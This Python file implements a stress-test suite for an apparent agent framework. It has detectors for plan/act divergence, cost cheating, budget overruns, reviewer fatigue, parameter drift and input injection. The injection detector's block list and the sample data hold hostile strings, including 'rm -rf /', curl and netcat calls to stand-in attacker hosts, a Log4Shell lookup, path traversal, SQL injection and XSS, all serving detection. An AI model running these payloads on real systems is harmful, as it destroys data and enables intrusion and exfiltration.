"""
Core Stress Suite and Guardrail Framework for CSCE v2.3
Implements the 12 failure modes and hardening measures identified in the critique
"""

import json
import hashlib
import time
import re
import ast
import subprocess
import tempfile
import os
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum

class RiskLevel(Enum):
    LOW = "low"
    MEDIUM = "medium" 
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class StressTestResult:
    test_name: str
    passed: bool
    risk_level: RiskLevel
    details: str
    artifacts: Dict[str, Any]

class PlanActDivergenceDetector:
    """Test 1: Plan/Act Divergence Detection"""
    
    def __init__(self):
        self.declared_steps = []
        self.actual_artifacts = []
    
    def record_declared_step(self, step: Dict[str, Any]):
        """Record what the plan declares it will do"""
        self.declared_steps.append({
            'action': step.get('action'),
            'preconditions': step.get('preconditions', []),
            'postconditions': step.get('postconditions', []),
            'timestamp': time.time()
        })
    
    def record_actual_artifact(self, artifact: Dict[str, Any]):
        """Record what actually happened"""
        self.actual_artifacts.append({
            'result': artifact.get('result'),
            'side_effects': artifact.get('side_effects', []),
            'timestamp': time.time()
        })
    
    def check_divergence(self) -> StressTestResult:
        """Check if declared plans match actual artifacts"""
        divergences = []
        
        for i, (declared, actual) in enumerate(zip(self.declared_steps, self.actual_artifacts)):
            declared_post = set(declared.get('postconditions', []))
            actual_effects = set(actual.get('side_effects', []))
            
            if not declared_post.issubset(actual_effects):
                divergences.append({
                    'step': i,
                    'declared': declared_post,
                    'actual': actual_effects,
                    'missing': declared_post - actual_effects
                })
        
        divergence_rate = len(divergences) / max(len(self.declared_steps), 1)
        
        return StressTestResult(
            test_name="plan_act_divergence",
            passed=divergence_rate < 0.1,  # Allow 10% divergence
            risk_level=RiskLevel.HIGH if divergence_rate > 0.3 else RiskLevel.MEDIUM,
            details=f"Divergence rate: {divergence_rate:.2%}, {len(divergences)} divergent steps",
            artifacts={'divergences': divergences, 'rate': divergence_rate}
        )

class MacroCheatDetector:
    """Test 2: Macro-Cheat Detection"""
    
    def __init__(self, cost_threshold: float = 0.2):
        self.cost_threshold = cost_threshold
    
    def expand_macros(self, dsl_code: str) -> str:
        """Expand all macros to primitive operations"""
        expanded = dsl_code
        
        macro_expansions = {
            'PLAN()': 'THINK(3) + ANALYZE(2) + STRUCTURE(1)',
            'CRITIQUE()': 'EVALUATE(2) + IDENTIFY_ISSUES(1) + SUGGEST_IMPROVEMENTS(1)',
            'VERIFY()': 'CHECK_LOGIC(2) + TEST_CASES(2) + VALIDATE_OUTPUT(1)'
        }
        
        for macro, expansion in macro_expansions.items():
            expanded = expanded.replace(macro, expansion)
        
        return expanded
    
    def calculate_cost(self, code: str) -> float:
        """Calculate computational cost of code"""
        operations = re.findall(r'\w+\(\d*\)', code)
        base_costs = {
            'THINK': 3, 'ANALYZE': 2, 'STRUCTURE': 1,
            'EVALUATE': 2, 'IDENTIFY_ISSUES': 1, 'SUGGEST_IMPROVEMENTS': 1,
            'CHECK_LOGIC': 2, 'TEST_CASES': 2, 'VALIDATE_OUTPUT': 1
        }
        
        total_cost = 0
        for op in operations:
            op_name = op.split('(')[0]
            if op_name in base_costs:
                total_cost += base_costs[op_name]
        
        return total_cost
    
    def detect_cheat(self, declared_code: str) -> StressTestResult:
        """Detect if declared cost differs significantly from expanded cost"""
        expanded_code = self.expand_macros(declared_code)
        
        declared_cost = self.calculate_cost(declared_code)
        expanded_cost = self.calculate_cost(expanded_code)
        
        if declared_cost == 0:
            cost_ratio = float('inf')
        else:
            cost_ratio = (expanded_cost - declared_cost) / declared_cost
        
        is_cheat = cost_ratio > self.cost_threshold
        
        return StressTestResult(
            test_name="macro_cheat_detection",
            passed=not is_cheat,
            risk_level=RiskLevel.HIGH if is_cheat else RiskLevel.LOW,
            details=f"Cost ratio: {cost_ratio:.2%}, declared: {declared_cost}, expanded: {expanded_cost}",
            artifacts={
                'declared_code': declared_code,
                'expanded_code': expanded_code,
                'declared_cost': declared_cost,
                'expanded_cost': expanded_cost,
                'cost_ratio': cost_ratio
            }
        )

class BudgetBypassDetector:
    """Test 3: Budget Bypass Detection"""
    
    def __init__(self, time_limit: float, money_limit: float, tool_limit: int):
        self.time_limit = time_limit
        self.money_limit = money_limit
        self.tool_limit = tool_limit
        self.start_time = time.time()
        self.money_spent = 0.0
        self.tools_used = 0
    
    def record_expense(self, cost: float):
        """Record money spent"""
        self.money_spent += cost
    
    def record_tool_use(self):
        """Record tool usage"""
        self.tools_used += 1
    
    def check_budgets(self) -> StressTestResult:
        """Check if any budgets have been exceeded"""
        current_time = time.time()
        elapsed_time = current_time - self.start_time
        
        violations = []
        
        if elapsed_time > self.time_limit:
            violations.append(f"Time exceeded: {elapsed_time:.2f}s > {self.time_limit}s")
        
        if self.money_spent > self.money_limit:
            violations.append(f"Money exceeded: ${self.money_spent:.2f} > ${self.money_limit:.2f}")
        
        if self.tools_used > self.tool_limit:
            violations.append(f"Tools exceeded: {self.tools_used} > {self.tool_limit}")
        
        return StressTestResult(
            test_name="budget_bypass_detection",
            passed=len(violations) == 0,
            risk_level=RiskLevel.CRITICAL if violations else RiskLevel.LOW,
            details=f"Violations: {violations}" if violations else "All budgets respected",
            artifacts={
                'elapsed_time': elapsed_time,
                'money_spent': self.money_spent,
                'tools_used': self.tools_used,
                'violations': violations
            }
        )

class InjectionGauntlet:
    """Test 4: Injection Attack Detection"""
    
    def __init__(self):
        self.injection_patterns = [
            "; rm -rf /",
            "&& curl evil.com",
            "| nc attacker.com 4444",
            
            "__import__('os').system('rm -rf /')",
            "eval('malicious_code')",
            "exec(open('backdoor.py').read())",
            
            "PLAN(); EXECUTE_SHELL('rm -rf /')",
            "THINK('; DROP TABLE users; --')",
            
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            
            "{{7*7}}",
            "${jndi:ldap://evil.com}",
            
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            
            "<script>alert('xss')</script>",
            "javascript:alert('xss')"
        ]
    
    def test_input_sanitization(self, input_text: str) -> StressTestResult:
        """Test if input contains injection patterns"""
        detected_patterns = []
        
        for pattern in self.injection_patterns:
            if pattern.lower() in input_text.lower():
                detected_patterns.append(pattern)
        
        return StressTestResult(
            test_name="injection_gauntlet",
            passed=len(detected_patterns) == 0,
            risk_level=RiskLevel.CRITICAL if detected_patterns else RiskLevel.LOW,
            details=f"Detected {len(detected_patterns)} injection patterns",
            artifacts={
                'input_text': input_text,
                'detected_patterns': detected_patterns,
                'total_patterns_tested': len(self.injection_patterns)
            }
        )

class ReviewerFatigueSimulator:
    """Test 5: Reviewer Fatigue Detection"""
    
    def __init__(self):
        self.review_times = []
        self.error_catch_rates = []
        self.session_start = time.time()
    
    def record_review(self, review_time: float, errors_caught: int, total_errors: int):
        """Record a review session"""
        self.review_times.append(review_time)
        catch_rate = errors_caught / max(total_errors, 1)
        self.error_catch_rates.append(catch_rate)
    
    def analyze_fatigue(self) -> StressTestResult:
        """Analyze reviewer fatigue patterns"""
        if len(self.review_times) < 3:
            return StressTestResult(
                test_name="reviewer_fatigue",
                passed=True,
                risk_level=RiskLevel.LOW,
                details="Insufficient data for fatigue analysis",
                artifacts={'review_count': len(self.review_times)}
            )
        
        recent_times = self.review_times[-3:]
        early_times = self.review_times[:3]
        
        avg_recent = sum(recent_times) / len(recent_times)
        avg_early = sum(early_times) / len(early_times)
        
        time_increase = (avg_recent - avg_early) / avg_early if avg_early > 0 else 0
        
        recent_rates = self.error_catch_rates[-3:]
        early_rates = self.error_catch_rates[:3]
        
        avg_recent_rate = sum(recent_rates) / len(recent_rates)
        avg_early_rate = sum(early_rates) / len(early_rates)
        
        rate_decrease = (avg_early_rate - avg_recent_rate) / avg_early_rate if avg_early_rate > 0 else 0
        
        time_fatigue = time_increase > 0.5  # 50% increase in review time
        accuracy_fatigue = rate_decrease > 0.2  # 20% decrease in catch rate
        
        fatigue_detected = time_fatigue or accuracy_fatigue
        
        return StressTestResult(
            test_name="reviewer_fatigue",
            passed=not fatigue_detected,
            risk_level=RiskLevel.HIGH if fatigue_detected else RiskLevel.LOW,
            details=f"Time increase: {time_increase:.1%}, Rate decrease: {rate_decrease:.1%}",
            artifacts={
                'time_increase': time_increase,
                'rate_decrease': rate_decrease,
                'time_fatigue': time_fatigue,
                'accuracy_fatigue': accuracy_fatigue,
                'review_count': len(self.review_times)
            }
        )

class EvolutionDriftDetector:
    """Test 6: Meta-optimization Stability"""
    
    def __init__(self):
        self.psi_history = []
        self.performance_history = []
    
    def record_psi_update(self, psi: Dict[str, Any], performance: float):
        """Record a psi update and its performance"""
        self.psi_history.append({
            'psi': psi.copy(),
            'performance': performance,
            'timestamp': time.time()
        })
        self.performance_history.append(performance)
    
    def detect_drift(self) -> StressTestResult:
        """Detect unstable psi evolution patterns"""
        if len(self.psi_history) < 5:
            return StressTestResult(
                test_name="evolution_drift",
                passed=True,
                risk_level=RiskLevel.LOW,
                details="Insufficient history for drift analysis",
                artifacts={'history_length': len(self.psi_history)}
            )
        
        oscillations = 0
        for key in ['u', 'g', 'h', 'r']:
            values = [entry['psi'].get(key, 0) for entry in self.psi_history[-5:]]
            direction_changes = 0
            for i in range(1, len(values)):
                if i > 1:
                    prev_direction = values[i-1] - values[i-2]
                    curr_direction = values[i] - values[i-1]
                    if prev_direction * curr_direction < 0:  # Sign change
                        direction_changes += 1
            
            if direction_changes >= 2:  # Oscillating
                oscillations += 1
        
        recent_perf = self.performance_history[-3:]
        early_perf = self.performance_history[:3]
        
        avg_recent = sum(recent_perf) / len(recent_perf)
        avg_early = sum(early_perf) / len(early_perf)
        
        regression = (avg_early - avg_recent) / avg_early if avg_early > 0 else 0
        
        drift_detected = oscillations >= 2 or regression > 0.1
        
        return StressTestResult(
            test_name="evolution_drift",
            passed=not drift_detected,
            risk_level=RiskLevel.HIGH if drift_detected else RiskLevel.LOW,
            details=f"Oscillations: {oscillations}/4 knobs, Regression: {regression:.1%}",
            artifacts={
                'oscillations': oscillations,
                'regression': regression,
                'psi_history': self.psi_history[-5:],
                'performance_trend': self.performance_history[-5:]
            }
        )

class StressSuiteRunner:
    """Main stress testing framework"""
    
    def __init__(self):
        self.detectors = {
            'plan_act_divergence': PlanActDivergenceDetector(),
            'macro_cheat': MacroCheatDetector(),
            'budget_bypass': BudgetBypassDetector(time_limit=30.0, money_limit=1.0, tool_limit=10),
            'injection_gauntlet': InjectionGauntlet(),
            'reviewer_fatigue': ReviewerFatigueSimulator(),
            'evolution_drift': EvolutionDriftDetector()
        }
        self.results = []
    
    def run_all_tests(self, test_data: Dict[str, Any]) -> List[StressTestResult]:
        """Run all stress tests"""
        results = []
        
        if 'plan_steps' in test_data and 'actual_artifacts' in test_data:
            detector = self.detectors['plan_act_divergence']
            for step in test_data['plan_steps']:
                detector.record_declared_step(step)
            for artifact in test_data['actual_artifacts']:
                detector.record_actual_artifact(artifact)
            results.append(detector.check_divergence())
        
        if 'dsl_code' in test_data:
            detector = self.detectors['macro_cheat']
            results.append(detector.detect_cheat(test_data['dsl_code']))
        
        detector = self.detectors['budget_bypass']
        if 'expenses' in test_data:
            for expense in test_data['expenses']:
                detector.record_expense(expense)
        if 'tool_uses' in test_data:
            for _ in range(test_data['tool_uses']):
                detector.record_tool_use()
        results.append(detector.check_budgets())
        
        if 'user_inputs' in test_data:
            detector = self.detectors['injection_gauntlet']
            for user_input in test_data['user_inputs']:
                result = detector.test_input_sanitization(user_input)
                if not result.passed:
                    results.append(result)
                    break
            else:
                results.append(StressTestResult(
                    test_name="injection_gauntlet",
                    passed=True,
                    risk_level=RiskLevel.LOW,
                    details="All inputs passed injection tests",
                    artifacts={'inputs_tested': len(test_data['user_inputs'])}
                ))
        
        if 'review_sessions' in test_data:
            detector = self.detectors['reviewer_fatigue']
            for session in test_data['review_sessions']:
                detector.record_review(
                    session['time'],
                    session['errors_caught'],
                    session['total_errors']
                )
            results.append(detector.analyze_fatigue())
        
        if 'psi_updates' in test_data:
            detector = self.detectors['evolution_drift']
            for update in test_data['psi_updates']:
                detector.record_psi_update(update['psi'], update['performance'])
            results.append(detector.detect_drift())
        
        self.results.extend(results)
        return results
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive stress test report"""
        total_tests = len(self.results)
        passed_tests = sum(1 for r in self.results if r.passed)
        
        risk_counts = {level: 0 for level in RiskLevel}
        for result in self.results:
            risk_counts[result.risk_level] += 1
        
        critical_failures = [r for r in self.results if not r.passed and r.risk_level == RiskLevel.CRITICAL]
        
        return {
            'summary': {
                'total_tests': total_tests,
                'passed_tests': passed_tests,
                'pass_rate': passed_tests / total_tests if total_tests > 0 else 0,
                'risk_distribution': {level.value: count for level, count in risk_counts.items()}
            },
            'critical_failures': [
                {
                    'test': f.test_name,
                    'details': f.details,
                    'artifacts': f.artifacts
                } for f in critical_failures
            ],
            'all_results': [
                {
                    'test': r.test_name,
                    'passed': r.passed,
                    'risk_level': r.risk_level.value,
                    'details': r.details
                } for r in self.results
            ],
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations based on test results"""
        recommendations = []
        
        failed_tests = [r for r in self.results if not r.passed]
        
        if any(r.test_name == 'plan_act_divergence' for r in failed_tests):
            recommendations.append("Implement step-commit semantics with deterministic replays")
        
        if any(r.test_name == 'macro_cheat_detection' for r in failed_tests):
            recommendations.append("Bill cost on expanded graph; require change-control for new primitives")
        
        if any(r.test_name == 'budget_bypass_detection' for r in failed_tests):
            recommendations.append("Implement hard budget enforcement with automatic termination")
        
        if any(r.test_name == 'injection_gauntlet' for r in failed_tests):
            recommendations.append("Implement strict input schemas and quarantined parsing")
        
        if any(r.test_name == 'reviewer_fatigue' for r in failed_tests):
            recommendations.append("Implement risk-tiering and automated fatigue detection")
        
        if any(r.test_name == 'evolution_drift' for r in failed_tests):
            recommendations.append("Add psi-inertia, cooldowns, and trust-region updates")
        
        return recommendations

def create_test_data() -> Dict[str, Any]:
    """Create sample test data for stress testing"""
    return {
        'plan_steps': [
            {
                'action': 'PLAN',
                'preconditions': ['problem_defined'],
                'postconditions': ['solution_outlined', 'steps_identified']
            },
            {
                'action': 'IMPLEMENT',
                'preconditions': ['solution_outlined'],
                'postconditions': ['code_written', 'tests_passed']
            }
        ],
        'actual_artifacts': [
            {
                'result': 'plan_created',
                'side_effects': ['solution_outlined', 'steps_identified']
            },
            {
                'result': 'code_implemented',
                'side_effects': ['code_written']  # Missing 'tests_passed'
            }
        ],
        'dsl_code': 'PLAN(); THINK(5); CRITIQUE(); VERIFY()',
        'expenses': [0.1, 0.2, 0.15],
        'tool_uses': 3,
        'user_inputs': [
            "Write a function to sort numbers",
            "; rm -rf /",  # Injection attempt
            "Calculate fibonacci sequence"
        ],
        'review_sessions': [
            {'time': 5.0, 'errors_caught': 3, 'total_errors': 3},
            {'time': 7.0, 'errors_caught': 2, 'total_errors': 4},
            {'time': 12.0, 'errors_caught': 1, 'total_errors': 5}  # Fatigue pattern
        ],
        'psi_updates': [
            {'psi': {'u': 1, 'g': 2, 'h': 'short', 'r': 'low'}, 'performance': 0.8},
            {'psi': {'u': 3, 'g': 1, 'h': 'long', 'r': 'high'}, 'performance': 0.7},
            {'psi': {'u': 1, 'g': 3, 'h': 'short', 'r': 'low'}, 'performance': 0.6},  # Oscillation
        ]
    }

if __name__ == "__main__":
    runner = StressSuiteRunner()
    test_data = create_test_data()
    
    results = runner.run_all_tests(test_data)
    report = runner.generate_report()
    
    print("=== CSCE v2.3 Stress Test Report ===")
    print(json.dumps(report, indent=2))
